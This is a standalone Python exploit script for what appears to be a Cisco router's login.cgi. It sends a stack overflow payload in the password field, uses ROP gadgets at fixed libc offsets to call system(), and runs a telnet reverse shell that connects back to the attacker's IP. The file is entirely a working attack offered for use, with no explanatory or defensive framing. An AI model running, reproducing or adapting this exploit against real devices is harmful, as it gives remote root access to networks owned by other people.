#!/usr/bin/env python3
import sys
import struct
import requests
import socket

def get_ip_address(): # Shamelessly stolen from stackoverflow
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip

def main():
    remote_ip = sys.argv[1]
    my_ip = get_ip_address()

    libc_base = 0x357fc000
    system_offset = 0x0004d144
    gadget_1_offset = 0x0002a135 # 0x0002a134 (0x0002a135): pop {r3, r7, pc}; ADD 1 TO ADDRESS BECAUSE ARMTHUMB
    gadget_2_offset = 0x00037884 # 0x00037884: mov r0, sp; blx r3;

    payload = b"A"*446
    payload += struct.pack("<I", libc_base + gadget_1_offset) # lr et donc pc
    payload += struct.pack("<I", libc_base + system_offset) # r3
    payload += b"AAAA" # r7
    payload += struct.pack("<I", libc_base + gadget_2_offset) # pc
    payload += f"telnet {my_ip} 7777 | /bin/sh | telnet {my_ip} 7776;#".encode()  # reverse shell telnet cmd

    login_page = f"https://{remote_ip}/login.cgi"
    user = "cisco"
    post_content = {
        "submit_button":"login",
        "submit_type":"",
        "gui_action":"",
        "wait_time":"",
        "change_action":"",
        "enc":"1",
        "user":user,
        "pwd":payload,
        "sel_lang":"EN"
    }

    # Pretty printing
    print(f"Offsets:\nlibc: {hex(libc_base)}\nsystem: {hex(system_offset)}\ngadget 1: {hex(gadget_1_offset)}\ngadget 2: {hex(gadget_2_offset)}\n")
    print(f"Callback IP: {my_ip}")
    print(f"Targeted endpoint: {login_page}")

    r = requests.post(login_page, data=post_content, verify=False)

if len(sys.argv) != 2:
    print(f"Usage: python3 {sys.argv[0]} <endpoint ip>")
else:
    main()

